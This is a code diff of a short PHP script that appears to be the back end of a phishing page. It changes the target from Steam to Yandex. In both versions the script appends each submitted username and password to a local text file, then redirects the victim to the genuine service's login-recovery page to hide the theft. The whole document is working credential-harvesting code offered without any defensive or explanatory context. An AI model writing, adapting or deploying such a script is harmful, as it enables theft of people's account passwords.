@@ -1,6 +1,6 @@
 <?php
 
-file_put_contents("usernames.txt", "Steam Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://help.steampowered.com/en/wizard/HelpWithLoginInfo/');
+file_put_contents("usernames.txt", "Yandex Username: " . $_POST['login'] . " Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);
+header('Location: https://passport.yandex.com/restoration');
 exit();
 ?>
